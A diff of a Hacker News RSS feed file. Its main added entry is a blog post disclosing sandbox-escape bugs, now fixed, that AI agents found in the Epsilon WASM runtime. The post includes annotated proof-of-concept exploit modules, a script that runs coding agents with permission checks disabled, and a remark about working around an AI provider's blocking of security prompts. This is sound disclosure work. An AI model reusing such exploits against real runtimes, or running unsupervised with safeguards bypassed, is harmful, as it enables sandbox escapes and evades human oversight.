@@ -1,87 +1,315 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2026-05-21T06:31:53.357273+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=48205415</id><title>Learnings from 100K lines of Rust with AI (2025)</title><updated>2026-05-21T06:32:07.829580+00:00</updated><content>&lt;doc fingerprint="b211521d6fb1cfce"&gt;
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2026-05-21T10:28:29.980705+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=48191572</id><title>All the bugs they found</title><updated>2026-05-21T10:28:38.107384+00:00</updated><content>&lt;doc fingerprint="1f838010ccf6f344"&gt;
   &lt;main&gt;
-    &lt;head rend="h1"&gt;Learnings from 100K Lines of Rust with AI&lt;/head&gt;
-    &lt;p&gt;In the past few months, I’ve been stress-testing how far AI coding agents can take us when building real, production-grade distributed systems.&lt;/p&gt;
-    &lt;p&gt;The result: a Rust-based multi-Paxos consensus engine that not only implements all the features of Azure’s Replicated State Library (RSL) [1] — which underpins most major Azure services — but also modernizes it for today’s hardware.&lt;/p&gt;
-    &lt;p&gt;The entire project took me ~3 months, with 100K lines of Rust code written in ~4 weeks and performance optimization from 23K operations/sec to 300K ops/sec achieved in ~3 weeks.&lt;/p&gt;
-    &lt;p&gt;Besides unprecedented productivity, I discovered several techniques that were instrumental. This post shares my most valuable learnings on: ensuring correctness with code contracts, applying lightweight spec-driven development, and pursuing aggressive performance optimization — plus my wish list for the future of AI-assisted coding.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Why Modernize RSL?&lt;/head&gt;
-    &lt;p&gt;Azure’s RSL implements the multi-Paxos consensus protocol and forms the backbone of replication in many Azure services. However, RSL was written more than a decade ago. While robust, it hasn’t evolved to match modern hardware and workloads.&lt;/p&gt;
-    &lt;p&gt;There are three key gaps motivated this project:&lt;/p&gt;
-    &lt;list rend="ol"&gt;
-      &lt;item&gt;No pipelining: When a vote is in flight, new requests must wait, inflating latency.&lt;/item&gt;
-      &lt;item&gt;No NVM support: Non-volatile memory is now common in Azure datacenters and can drastically reduce commit time.&lt;/item&gt;
-      &lt;item&gt;Limited hardware awareness: RSL wasn’t built to leverage RDMA, which is now pervasive in Azure data centers.&lt;/item&gt;
+    &lt;head rend="h1"&gt;All the bugs they found&lt;/head&gt;
+    &lt;p&gt;Last year I wrote a small WASM runtime in Go, Epsilon. As far as runtimes go, this is a pretty simple one: no JIT, just a pure instruction interpreter in ~11k lines of code. It is also very extensively tested against the official WASM testsuite.&lt;/p&gt;
+    &lt;p&gt;Epsilon is designed to be embeddable in other applications and provide a sandbox for potentially untrusted code.&lt;/p&gt;
+    &lt;p&gt;How many security vulnerabilities do you think AI agents found in it?&lt;/p&gt;
+    &lt;p&gt;More than 20.&lt;/p&gt;
+    &lt;p&gt;Most of these were somewhat simple DoS attacks, e.g. panics during parsing or validation. Some were clear API design failures that would probably have surfaced sooner with a bit more usage of the project. A few weren't exploitable on their own, but would become serious if combined with a future bug elsewhere.&lt;/p&gt;
+    &lt;p&gt;A handful, though, were properly interesting: sandbox escapes that let a malicious WASM module break out of its isolation and reach into another module's private state. These are my favorites.&lt;/p&gt;
+    &lt;head rend="h2"&gt;Background&lt;/head&gt;
+    &lt;p&gt;A single Epsilon runtime can host multiple WASM modules. In the WASM security model, modules are isolated except for explicitly exported (and imported) objects. Unexported functions, memories, etc., are private to the module that defined them.&lt;/p&gt;
+    &lt;p&gt; WASM is a typed stack machine, but the type checking does not happen at runtime: before execution, a validator walks the bytecode and verifies that at any point the values on the stack have the expected type. For example, a module that tried to &lt;code&gt;local.set&lt;/code&gt; an &lt;code&gt;i32&lt;/code&gt; into a &lt;code&gt;funcref&lt;/code&gt; local would be
+            rejected before it ever started running. Epsilon then executes blindly, trusting the
+            validator's earlier checks.
+          &lt;/p&gt;
+    &lt;p&gt; Thanks to the type guarantees provided by the validator, a &lt;code&gt;funcref&lt;/code&gt; at runtime in Epsilon is represented as an &lt;code&gt;int32&lt;/code&gt;:
+            &lt;code&gt;-1&lt;/code&gt; is the null sentinel, and any non-negative value is an index into the
+            global function store, shared across all modules instantiated in the runtime. As a
+            result, the constant &lt;code&gt;0&lt;/code&gt; and a &lt;code&gt;funcref&lt;/code&gt; pointing to the first
+            function in the store are indistinguishable during execution. This simplifies the
+            implementation and improves performance, at the cost of delegating safety entirely to
+            the validator.
+          &lt;/p&gt;
+    &lt;p&gt;Each attacker module in the following sections runs alongside the same victim module:&lt;/p&gt;
+    &lt;code&gt;(module
+  (func $secret (result i32)   ;; declares a function $secret: takes no parameters,
+                               ;; returns a 32-bit integer. Private, never exported
+    i32.const 1337             ;; pushes 1337 onto the stack; becomes the return value
+  )
+)&lt;/code&gt;
+    &lt;p&gt; Since &lt;code&gt;$secret&lt;/code&gt; is the first function instantiated into the runtime, it lives
+            at store index 0. The goal of each attacker module is to get the VM to call it,
+            returning &lt;code&gt;1337&lt;/code&gt;, despite never being given a legitimate
+            &lt;code&gt;funcref&lt;/code&gt; to it.
+          &lt;/p&gt;
+    &lt;head rend="h2"&gt;1. Zero Is Not Null&lt;/head&gt;
+    &lt;p&gt;The simplest of the three. Here's the attacker:&lt;/p&gt;
+    &lt;code&gt;(module
+  (type $t (func (result i32)))   ;; the call_indirect type signature
+  (table 1 funcref)               ;; a table of size 1 (essentially an array of funcrefs).
+                                  ;; Identified by its module-level index, which is 0
+                                  ;; here since it's the first (and only) table declared
+
+  (func (export "exploit") (result i32)
+    (local $f funcref)            ;; declared, never assigned;
+                                  ;; per spec, ref locals default to null
+
+    i32.const 0                   ;; the slot in the table where we'll write
+                                  ;; stack: [0]
+    local.get $f                  ;; push $f's value (null)
+                                  ;; stack: [0, null]
+    table.set 0                   ;; immediate 0 picks which table to write to
+                                  ;; (tables[0]); pops two values from the stack:
+                                  ;; first the funcref (null), then the slot index.
+                                  ;; Writes tables[0][0] = null
+                                  ;; stack: []
+
+    i32.const 0                   ;; the slot in the table to fetch from next
+                                  ;; stack: [0]
+    call_indirect (type $t)       ;; pop the slot, fetch tables[0][slot] (null),
+                                  ;; and call it
+  )
+)&lt;/code&gt;
+    &lt;p&gt; The &lt;code&gt;exploit&lt;/code&gt; function, while perfectly valid WASM, should trap at runtime.
+            The local &lt;code&gt;$f&lt;/code&gt; is uninitialized, therefore null.
+            &lt;code&gt;call_indirect&lt;/code&gt; should fail.
+          &lt;/p&gt;
+    &lt;p&gt;Except that in Epsilon, it didn't. It called &lt;code&gt;$secret&lt;/code&gt; instead.&lt;/p&gt;
+    &lt;p&gt; The culprit was how locals were initialized. When a function is called, the spec requires locals to be initialized to their default values: zero for numeric and vector types, but null for reference types. Epsilon achieved this by zeroing all non-parameter locals using Go's &lt;code&gt;clear()&lt;/code&gt;:
+          &lt;/p&gt;
+    &lt;code&gt;// Clear non-parameter locals to their zero values.
+clear(locals[numParams:])&lt;/code&gt;
+    &lt;p&gt; This was idiomatic and fast, but Go's &lt;code&gt;clear()&lt;/code&gt; simply set the local to
+            &lt;code&gt;0&lt;/code&gt;. Per our funcref representation, that's not null (&lt;code&gt;-1&lt;/code&gt;): it's
+            the store index of &lt;code&gt;$secret&lt;/code&gt;. When &lt;code&gt;exploit&lt;/code&gt; was called, rather
+            than trapping on a null &lt;code&gt;call_indirect&lt;/code&gt;, the VM called the function at store
+            index 0.
+          &lt;/p&gt;
+    &lt;head rend="h2"&gt;2. Phantom Block Parameter&lt;/head&gt;
+    &lt;p&gt;This one combines two separate bugs:&lt;/p&gt;
+    &lt;code&gt;(module
+  (type $t (func (result i32)))
+  (table 1 funcref)
+
+  (func (export "exploit") (result i32)
+    (local $f funcref)
+
+    ref.null func               ;; push a null funcref onto the stack
+    i32.const 0
+
+    (block (param i32)          ;; block consumes the i32 from the stack...
+      drop                      ;; ...and immediately drops it
+    )
+
+    local.set $f                ;; store top of stack into $f (the null funcref)
+    local.get $f
+    ref.is_null                 ;; is $f null?
+
+    if (result i32)
+      i32.const 42              ;; expected path: $f was null, return 42
+    else                        ;; unreachable path: $f is always null
+      i32.const 0
+      local.get $f
+      table.set 0
+      i32.const 0
+      call_indirect (type $t)
+    end
+  )
+)&lt;/code&gt;
+    &lt;p&gt; In any correct WASM implementation (and indeed in the latest version of Epsilon), &lt;code&gt;exploit&lt;/code&gt; returns &lt;code&gt;42&lt;/code&gt;, as expected. It returned &lt;code&gt;1337&lt;/code&gt;
+            instead.
+          &lt;/p&gt;
+    &lt;head rend="h3"&gt;Stack Height Misalignment&lt;/head&gt;
+    &lt;p&gt; During their execution, control-flow blocks (&lt;code&gt;block&lt;/code&gt;,
+            &lt;code&gt;loop&lt;/code&gt;, &lt;code&gt;if&lt;/code&gt;) may consume inputs from the stack and produce
+            results on it. At the end of execution the stack must look exactly as the block's
+            signature describes: N_params consumed, N_results pushed in their place. Anything the
+            body left in between has to be discarded, so the runtime needs to know how high the
+            stack was when entering the block.
+          &lt;/p&gt;
+    &lt;p&gt;In Epsilon, that height was recorded when a new control frame was pushed onto the control frame stack:&lt;/p&gt;
+    &lt;code&gt;vm.pushControlFrame(frame, controlFrame{
+    stackHeight: vm.stack.size(),   // height at block entry
+    // ...
+})&lt;/code&gt;
+    &lt;p&gt;But here lies the first bug: that line captures the stack height after the block's parameters are already pushed. In WASM, parameters are consumed by the block: they belong to the block, not to the surrounding scope. So the validator and the VM now disagree by exactly N parameters about where "the bottom of the block" is on the stack.&lt;/p&gt;
+    &lt;head rend="h3"&gt;Memory Resurrection&lt;/head&gt;
+    &lt;p&gt; When a block ends, the VM calls &lt;code&gt;unwind&lt;/code&gt; to restore the stack to its
+            declared, pre-block height. &lt;code&gt;targetHeight&lt;/code&gt; is the stack height recorded in
+            the &lt;code&gt;controlFrame&lt;/code&gt; structure.
+          &lt;/p&gt;
+    &lt;code&gt;func (s *valueStack) unwind(targetHeight, preserveCount uint32) {
+    valuesToPreserve := s.data[s.size()-preserveCount:]
+    s.data = s.data[:targetHeight]
+    s.data = append(s.data, valuesToPreserve...)
+}&lt;/code&gt;
+    &lt;p&gt; Because of the stack height misalignment bug above, &lt;code&gt;targetHeight&lt;/code&gt; is too
+            high: it counts the block's parameters as if they were still on the stack. Therefore
+            &lt;code&gt;s.data[:targetHeight]&lt;/code&gt; causes the slice to grow back rather than be
+            truncated. As long as &lt;code&gt;targetHeight &amp;lt;= cap(s.data)&lt;/code&gt;, Go is happy to
+            re-expose whatever was sitting in the backing array.
+          &lt;/p&gt;
+    &lt;p&gt;Parameters that the validator considered consumed are now resurrected on top of the stack.&lt;/p&gt;
+    &lt;head rend="h3"&gt;Bugs Collide&lt;/head&gt;
+    &lt;p&gt;Let's walk through the &lt;code&gt;exploit&lt;/code&gt; function with both bugs in mind:&lt;/p&gt;
+    &lt;code&gt;(func (export "exploit") (result i32)
+  (local $f funcref)
+
+  ref.null func        ;; stack: [null_funcref]
+  i32.const 0          ;; 0 is the index where $secret happens to sit in the
+                       ;; global function store, since it was the very first
+                       ;; function instantiated
+                       ;; stack: [null_funcref, 0]
+
+  (block (param i32)   ;; bug #1: VM records stackHeight = 2; the validator,
+                       ;; treating the i32 as consumed (per spec), records 1
+    drop               ;; pops and discards the top of the stack (the 0)
+                       ;; stack: [null_funcref]
+  )                    ;; bug #2: `end` calls unwind, which sets s.data to
+                       ;; s.data[:2], so len 1 grows back to 2, and the 0 we
+                       ;; dropped resurrects on top. The top is now an int32
+                       ;; of value 0, but the validator still thinks it's a
+                       ;; funcref
+                       ;; stack: [null_funcref, 0]
+
+  local.set $f         ;; 0 is put in $f, which should be a funcref. Since
+                       ;; Epsilon's internal representation of funcref is also
+                       ;; an int32, this works at runtime
+  local.get $f         ;; stack: [null_funcref, 0]
+  ref.is_null          ;; null is -1, so 0 isn't null; pops the funcref and
+                       ;; pushes 0 (false). The top of the stack visually
+                       ;; still looks like 0, but its type changed from
+                       ;; funcref to i32
+                       ;; stack: [null_funcref, 0 (i32 false)]
+
+  if (result i32)      ;; pops the i32 condition (0, false), so the else
+                       ;; branch fires
+                       ;; stack: [null_funcref]
+    i32.const 42       ;; not taken
+  else
+    i32.const 0        ;; the slot index for the upcoming table.set
+                       ;; stack: [null_funcref, 0]
+    local.get $f       ;; the funcref value to store (actually the int32 0)
+                       ;; stack: [null_funcref, 0, 0]
+    table.set 0        ;; pops the funcref then the slot index; both are 0,
+                       ;; so tables[0][0] now holds the integer 0 dressed as
+                       ;; a funcref
+                       ;; stack: [null_funcref]
+    i32.const 0        ;; the slot index within the table to look up
+                       ;; stack: [null_funcref, 0]
+    call_indirect (type $t)
+                       ;; pops the slot index, fetches tables[0][0] (our
+                       ;; int 0 dressed as a funcref), which points at
+                       ;; store[0] = $secret. Call it.
+  end
+)&lt;/code&gt;
+    &lt;p&gt;A perfectly valid WASM module just called an unexported function from another module. By choosing a different integer, it could reach any private function in Epsilon's global store.&lt;/p&gt;
+    &lt;head rend="h2"&gt;3. Ghost in the Stack&lt;/head&gt;
+    &lt;p&gt;The first two exploits relied on the validator and VM disagreeing about values on the stack inside the sandbox. This one shifts category: the disagreement is between a host function's declared signature and what it actually returns at runtime.&lt;/p&gt;
+    &lt;code&gt;(module
+  (type $t (func (result i32)))
+  (import "env" "leak" (func $leak (result funcref)))   ;; the host must provide env.leak
+  (table 1 funcref)
+
+  (func (export "exploit") (result i32)
+    i32.const 0          ;; table index
+    i32.const 0          ;; index of $secret in the global function store
+
+    call $leak           ;; declared to return a funcref; the validator thinks
+                         ;; the stack gains one new value after this call
+
+    table.set 0          ;; store the "result" (actually our 0) into the table
+    i32.const 0
+    call_indirect (type $t)
+    return
+  )
+)&lt;/code&gt;
+    &lt;p&gt; For this exploit to land, the host needs to provide a function &lt;code&gt;env.leak&lt;/code&gt; whose runtime behavior diverges from its signature: one that
+            returns fewer results than promised.
+          &lt;/p&gt;
+    &lt;p&gt;In a correct WASM implementation, the runtime should trap on that mismatch. In Epsilon, the VM blindly trusted the host's declared signature:&lt;/p&gt;
+    &lt;code&gt;res := fun.hostCode(fun.module, args...)
+vm.stack.pushAll(res)&lt;/code&gt;
+    &lt;p&gt; If &lt;code&gt;leak&lt;/code&gt; returned an empty slice instead of the promised funcref,
+            &lt;code&gt;pushAll&lt;/code&gt; did nothing. The validator believed a funcref had been pushed.
+            Instead, the stack was unchanged.
+          &lt;/p&gt;
+    &lt;p&gt; The two &lt;code&gt;0&lt;/code&gt;s pushed before &lt;code&gt;$leak&lt;/code&gt; were still on the stack. The VM
+            ran &lt;code&gt;table.set 0&lt;/code&gt; and popped them: one as the funcref, one as the slot index.
+            &lt;code&gt;tables[0][0]&lt;/code&gt; now held the integer 0. &lt;code&gt;call_indirect&lt;/code&gt; fetched it
+            and happily called the function at index 0, &lt;code&gt;$secret&lt;/code&gt;.
+          &lt;/p&gt;
+    &lt;head rend="h2"&gt;Methodology&lt;/head&gt;
+    &lt;p&gt;I used a combination of approaches to find these bugs, starting with a script similar to the one described in the Black-hat LLMs talk:&lt;/p&gt;
+    &lt;head&gt;Show the script&lt;/head&gt;
+    &lt;code&gt;#!/bin/bash
+
+# Directory to store vulnerability reports
+VULN_DIR="vulnerabilities"
+mkdir -p "$VULN_DIR"
+
+# List of areas to investigate
+AREAS=(
+    "epsilon/parser.go"
+    "epsilon/validation.go"
+    "epsilon/vm.go"
+    "epsilon/memory.go"
+    "epsilon/imports.go"
+    "wasip1/wasi_resources.go"
+    "wasip1/wasi_poll.go"
+    "wasip1/wasi_unix.go"
+)
+
+PROMPT_TEMPLATE="You are an expert security researcher and exploit developer.
+
+STRICT CONSTRAINT: Do NOT modify any file outside the '$VULN_DIR/' directory. Do not touch 'epsilon/', 'wasip1/', or any other source file. All output goes in '$VULN_DIR/' only.
+
+Your task is to objectively investigate the following file for security vulnerabilities: %s
+
+Explore the file and any related files, data structures, or interactions it depends on. Where relevant, check behavior against the WebAssembly 2.0 specification (https://webassembly.github.io/spec/versions/core/WebAssembly-2.0.pdf) and the WASI Preview 1 specification â a deviation from spec in security-sensitive code is itself a vulnerability. Do not flag missing features from specs beyond WebAssembly 2.0.
+
+Do not assume a vulnerability exists. If after thorough investigation you find nothing exploitable, state so clearly and stop.
+
+If you confirm a vulnerability:
+1. Create a dedicated directory: '$VULN_DIR/&amp;lt;vulnerability_name&amp;gt;/'
+2. Write 'README.md' with: root cause, impact, and reproduction steps
+3. Write a PoC exploit: a concrete, runnable demonstration (Go test, .wasm file, or script) that proves the vulnerability is triggerable by a malicious WebAssembly module without any special host configuration"
+
+# Get agent from command line, default to claude
+AGENT=${1:-claude}
+
+if [ "$AGENT" == "claude" ]; then
+    AGENT_CMD="claude --dangerously-skip-permissions"
+elif [ "$AGENT" == "gemini" ]; then
+    AGENT_CMD="gemini --yolo"
+elif [ "$AGENT" == "vibe" ]; then
+    AGENT_CMD="vibe --trust"
+else
+    echo "Usage: $0 [claude|gemini|vibe]"
+    exit 1
+fi
+
+for AREA in "${AREAS[@]}"; do
+    echo "--------------------------------------------------"
+    echo "Starting investigation of area: $AREA using $AGENT"
+    echo "--------------------------------------------------"
+
+    CURRENT_PROMPT=$(printf "$PROMPT_TEMPLATE" "$AREA")
+
+    $AGENT_CMD -p "$CURRENT_PROMPT"
+
+    echo "Finished investigation of $AREA."
+    echo "Sleeping for 10 seconds to respect rate limits..."
+    sleep 10
+done&lt;/code&gt;
+    &lt;p&gt;Then I moved to a skill instead, which is slightly more convenient.&lt;/p&gt;
+    &lt;p&gt;I'm honestly not sure which one is better as I've used them at different times: by the time I switched, the script had already found the low-hanging fruit, so the skill never had a chance at those. Re-discovering the same bugs this way is left as an exercise to the reader.&lt;/p&gt;
+    &lt;p&gt;To work around token limits, I also used a variety of models, mainly:&lt;/p&gt;
+    &lt;list rend="ul"&gt;
+      &lt;item&gt;Gemini 3 Flash&lt;/item&gt;
+      &lt;item&gt;Gemini 3.1 Pro&lt;/item&gt;
+      &lt;item&gt;Opus 4.7&lt;/item&gt;
     &lt;/list&gt;
-    &lt;p&gt;Removing these limitations could unlock significantly lower latency and higher throughput — critical for modern cloud workloads and AI-driven services.&lt;/p&gt;
-    &lt;p&gt;Given my interest in Rust and AI-accelerated development, I set out to build a modern RSL equivalent from scratch.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Massive Productivity Boost&lt;/head&gt;
-    &lt;p&gt;In roughly six weeks, I’ve driven AI and implemented over 130K lines of Rust code covering the full feature set of RSL, including multi-Paxos, leader election, log replication, snapshotting, and configuration changes.&lt;/p&gt;
-    &lt;p&gt;I utilized many available AI coding agents: GitHub Copilot, Claude Code, Codex, Augment Code, Kiro, and Trae. My workflow evolved quickly, but today my main drivers are Claude Code and Codex CLI, with VS Code handling diffs and minor edits.&lt;/p&gt;
-    &lt;p&gt;I’ve found that coding from the CLI creates a perfect asynchronous flow that maximizes my productivity. I also discovered a simple psychological trick:&lt;/p&gt;
-    &lt;quote&gt;
-      &lt;p&gt;I pay $100/month for Anthropic’s max plan. This became a forcing function — if I don’t kick off a coding task with Claude before bed, I feel like I’m wasting money.&lt;/p&gt;
-    &lt;/quote&gt;
-    &lt;p&gt;When Codex CLI arrived, I added a second ChatGPT Plus subscription to handle rate limits — one subscription for Monday–Wednesday, the other for Thursday–Sunday.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Code Contracts — By AI, For AI&lt;/head&gt;
-    &lt;p&gt;The question I get most often is: How can AI possibly implement something as complex as Paxos correctly?&lt;/p&gt;
-    &lt;p&gt;Testing is the first layer of defense. My system now includes 1,300+ tests — from unit tests to minimal integration tests (e.g., proposer + acceptor only), all the way to multi-replica full integration tests with injected failures. See the project status.&lt;/p&gt;
-    &lt;p&gt;But the real breakthrough came from AI-driven code contracts.&lt;/p&gt;
-    &lt;p&gt;Code contracts specify preconditions, postconditions, and invariants for critical functions. These contracts are converted into runtime asserts during testing but can be disabled in production builds for performance. While I started using this approach long ago with .NET [2], AI has made contracts vastly more powerful.&lt;/p&gt;
-    &lt;p&gt;Here’s how I apply them at three levels:&lt;/p&gt;
-    &lt;p&gt;1. Ask AI to write contracts. Opus 4.1 writes good contracts, but GPT-5 High writes excellent ones. I focus on reviewing and refining. For example, the &lt;code&gt;process_2a&lt;/code&gt; method (handling phase 2a messages in Paxos) has 16 contracts, including this one:&lt;/p&gt;
-    &lt;p&gt;2. Generate tests from contracts. Once contracts are defined, I ask AI to create targeted test cases for each post-condition. It excels at this, generating meaningful edge cases automatically.&lt;/p&gt;
-    &lt;p&gt;3. Property-based tests for contracts. This is my favorite. AI translates contracts into property-based tests, exploring a vast space of randomized inputs. Any contract violation triggers a panic, exposing deep bugs early.&lt;/p&gt;
-    &lt;p&gt;For instance, one AI-generated contract found a subtle Paxos safety violation:&lt;/p&gt;
-    &lt;p&gt;That single contract saved what could have been a serious replication consistency issue — well before it ever hits production.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Lightweight Spec-Driven Development&lt;/head&gt;
-    &lt;p&gt;I’ve tried various Spec-Driven Development (SDD) tools. In fact, the earlier components (such as leader election, proposer, acceptor, and learner) were all implemented following a rigid SDD approach. I would start with a requirement markdown, turn it into a design markdown, and then a task list markdown. However, I gradually found this process too rigid; making changes along the way and ensuring all documents remained consistent became a headache.&lt;/p&gt;
-    &lt;p&gt;I’ve now switched to a more lightweight approach. When I work on a feature (e.g., snapshotting), I use &lt;code&gt;/specify&lt;/code&gt; from spec kit [3] to generate a spec markdown. This spec consists of a few user stories and acceptance criteria.&lt;/p&gt;
-    &lt;p&gt;Here is an example user story for snapshotting:&lt;/p&gt;
-    &lt;p&gt;I then use &lt;code&gt;/clarify&lt;/code&gt; to ask the AI to self-critique and improve the user stories and criteria. I also ask it to suggest additional user stories not covered in the initial spec. I spend the majority of my time here.&lt;/p&gt;
-    &lt;p&gt;Once satisfied, I jump into plan mode and ask AI to generate a plan for a specific user story. Given the capability of today’s AI coding agents, a single user story feels like the “sweet spot” unit of work they can manage effectively. Along the way, we may discover additions or tweaks, which are easy to handle in the same coding session (agents might compress context, but I typically don’t worry about losing too much).&lt;/p&gt;
-    &lt;p&gt;Here is a sample &lt;code&gt;/clarify&lt;/code&gt; interaction for configuration changes:&lt;/p&gt;
-    &lt;code&gt;● Question 4: Starting Slot Determination
-
-  How should the starting slot for the new configuration be determined relative to the ending slot?
-
-  Recommended: Option A - Always exactly ending_slot + 1
-
-  This ensures no gaps in the slot sequence and maintains continuity between configurations, preventing any slots from being orphaned or unassigned.
-
-  | Option | Description                                                    |
-  |--------|----------------------------------------------------------------|
-  | A      | Always exactly ending_slot + 1                                 |
-  | B      | Allow operator to specify any value &amp;gt; ending_slot              |
-  | C      | Next multiple of 1000 after ending_slot for cleaner boundaries |
-  | D      | Same as ending_slot (both configs share final slot)            |
-
-  You can reply with the option letter (e.g., "A"), accept the recommendation by saying "yes" or "recommended", or provide your own short answer.
-&lt;/code&gt;
-    &lt;head rend="h2"&gt;Aggressive Performance Optimization&lt;/head&gt;
-    &lt;p&gt;Performance optimization is where AI really shines. After ensuring initial correctness, I spent about three weeks purely on throughput tuning — and AI became my co-pilot in performance engineering.&lt;/p&gt;
-    &lt;p&gt;Through iterative cycles, we boosted throughput from ~23K ops/sec to ~300K ops/sec on a single laptop. Here’s the loop I followed repeatedly:&lt;/p&gt;
-    &lt;list rend="ol"&gt;
-      &lt;item&gt;Ask AI to instrument latency metrics across all code paths.&lt;/item&gt;
-      &lt;item&gt;Run performance tests and output trace logs.&lt;/item&gt;
-      &lt;item&gt;Let AI analyze latency breakdowns (it writes Python scripts to calculate quantiles and identify bottlenecks).&lt;/item&gt;
-      &lt;item&gt;Ask AI to propose optimizations, implement one, re-measure, and repeat.&lt;/item&gt;
-    &lt;/list&gt;
-    &lt;p&gt;This process surfaced insights I might have missed — for example, lock contention on async paths, redundant memory copies, and unnecessary task spawns.&lt;/p&gt;
-    &lt;p&gt;Rust’s safety model made it easy to push these optimizations confidently. Key gains came from minimizing allocations, applying zero-copy techniques, avoiding locks, and selectively removing async overhead. Each improvement felt like peeling another layer of latency off a high-performance engine — without fear of corrupting memory.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Wish List for AI-Assisted Coding&lt;/head&gt;
-    &lt;p&gt;Reflecting on my journey, I keep wondering where AI could deliver even more value. Here are some items on my wish list:&lt;/p&gt;
-    &lt;p&gt;End-to-End User Story Execution: I still prefer to define the user stories myself. As an architect, I feel I have a better sense of what I’m building and how I’d like to build it. However, the delivery of a perfect execution is something I believe AI can handle increasingly well. Today, I still have to spend a fair amount of time steering the AI — telling it to continue when it pauses, suggesting refactoring, reviewing test coverage, and suggesting additional tests. I would prefer the AI take more autonomy to drive this end-to-end.&lt;/p&gt;
-    &lt;p&gt;Automated Contract Workflows: The flow of applying contracts seems largely automatable. While I’d still want to review the contracts and offer suggestions, I’d like the AI to drive the rest: generating tests based on contracts, debugging individual test cases, ensuring consistency between tests and contracts, and writing property-based tests. When a test fails, I’d like the AI to debug and fix trivial issues automatically, only notifying me when there are genuine correctness issues in the contracts or the implementation.&lt;/p&gt;
-    &lt;p&gt;Autonomous Performance Optimization: Performance tuning seems ripe for more automation. Much of what I’ve done is repetitive and parallelizable. Projects like AlphaEvolve (or OpenEvolve) show promise in this direction. Ideally, I would suggest potential optimization avenues, and the AI would execute the experiments completely by itself. While current tools handle small bodies of code, applying similar techniques to larger codebases with end-to-end measurement seems feasible.&lt;/p&gt;
-    &lt;head rend="h2"&gt;Appendix: Project Status&lt;/head&gt;
-    &lt;p&gt;The seed of the project is an elegant design markdown authored by Jay Lorch [4] from Microsoft Research. This design greatly simplifies all the components in multi-Paxos, making it easier to implement and reason about.&lt;/p&gt;
-    &lt;p&gt;So far, 2 out of the 3 RSL limitations have been addressed: pipelining and NVM support (Jay integrated the fully verified persistence log for NVM which was published in the &lt;code&gt;PoWER Never Corrupts&lt;/code&gt; paper [5] at OSDI 2025). The RDMA support is still TBD.&lt;/p&gt;
-    &lt;p&gt;To date, the project has grown to over 130K lines of Rust code, with 1,300+ tests accounting for more than 65% of the codebase.&lt;/p&gt;
+    &lt;p&gt;Again, it's hard to compare their performance as they were used at different times. Most of the more serious problems were discovered by Gemini 3.1 Pro, which is the main model I used at the beginning.&lt;/p&gt;
+    &lt;p&gt;Trying to work around Anthropic blocking security-related prompts does get pretty tiring though.&lt;/p&gt;
+    &lt;head rend="h2"&gt;Closing thoughts&lt;/head&gt;
+    &lt;p&gt;Epsilon is a weekend hobby project, so I went in expecting agents to find something. It was still astonishing to see some of these issues. Bug #2 in particular is pretty cool.&lt;/p&gt;
+    &lt;p&gt;Please update to version 0.1.0.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://zfhuang99.github.io/rust/claude%20code/codex/contracts/spec-driven%20development/2025/12/01/rust-with-ai.html"/><published>2026-05-20T10:04:28+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48205782</id><title>Google's AI is being manipulated. The search giant is quietly fighting back</title><updated>2026-05-21T06:32:07.689766+00:00</updated><content>&lt;doc fingerprint="3900924018860dfd"&gt;
+&lt;/doc&gt;</content><link href="https://andreapivetta.com/posts/all-the-bugs-they-found.html"/><published>2026-05-19T10:33:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48205782</id><title>Google’s AI is being manipulated. The search giant is quietly fighting back</title><updated>2026-05-21T10:28:37.764080+00:00</updated><content>&lt;doc fingerprint="3900924018860dfd"&gt;
   &lt;main&gt;
     &lt;head rend="h1"&gt;Google's AI is being manipulated. The search giant is quietly fighting back&lt;/head&gt;
     &lt;p&gt;A BBC investigation revealed a simple way AI chatbots are being made to spit out misinformation to the public. Google and other AI companies are now trying to fix the problem.&lt;/p&gt;
@@ -119,7 +347,7 @@
     &lt;p&gt;For more technology news and insights, sign up to our Tech Decoded newsletter, while The Essential List delivers a handpicked selection of features and insights to your inbox twice a week.&lt;/p&gt;
   &lt;/main&gt;
   &lt;comments/&gt;
-&lt;/doc&gt;</content><link href="https://www.bbc.com/future/article/20260519-google-tackles-attempts-to-hack-its-ai-results"/><published>2026-05-20T10:57:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48206340</id><title>Saying goodbye to asm.js</title><updated>2026-05-21T06:32:07.554441+00:00</updated><content>&lt;doc fingerprint="540e92cecc53bea6"&gt;
+&lt;/doc&gt;</content><link href="https://www.bbc.com/future/article/20260519-google-tackles-attempts-to-hack-its-ai-results"/><published>2026-05-20T10:57:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=48206340</id><title>Saying goodbye to asm.js</title><updated>2026-05-21T10:28:37.581764+00:00</updated><content>&lt;doc fingerprint="540e92cecc53bea6"&gt;
   &lt;main&gt;
     &lt;quote&gt;&lt;p&gt;Axe-time, sword-time, shields are sundered,&lt;/p&gt;&lt;lb/&gt;Wind-time, wolf-time, ere the world falls.&lt;lb/&gt;– Völuspá, Poetic Edda&lt;/quote&gt;
